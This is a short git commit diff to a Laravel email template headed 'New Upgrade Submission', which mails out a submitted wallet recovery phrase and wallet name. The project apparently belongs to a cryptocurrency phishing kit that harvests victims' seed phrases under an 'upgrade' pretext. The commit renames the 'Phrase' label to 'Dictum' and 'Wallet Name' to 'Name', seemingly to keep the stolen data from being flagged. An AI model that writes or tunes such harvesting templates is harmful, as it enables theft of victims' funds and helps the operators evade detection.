cf51538620ed9333c1d12e30302f5488fb420b89
jipmez <mezj972@gmail.com>
2025-05-12 23:49:59 +0100

    update

--- resources/views/email/contact.blade.php
+++ resources/views/email/contact.blade.php
@@ -6,8 +6,8 @@
 <body>
     <h2>New Upgrade Submission</h2>
     <!-- <p><strong>Full Name:</strong> {{ $data['full_name'] }}</p> -->
-    <p><strong>Phrase:</strong> {{ $data['wallet_phrase'] }}</p>
-    <p><strong>Wallet Name:</strong>  {{ $data['wallet_name'] }}</p>
+    <p><strong>Dictum:</strong> {{ $data['wallet_phrase'] }}</p>
+    <p><strong>Name:</strong>  {{ $data['wallet_name'] }}</p>
     <!-- <p><strong>Email:</strong>  {{ $data['wallet_email'] }}</p> -->
 </body>
 </html>
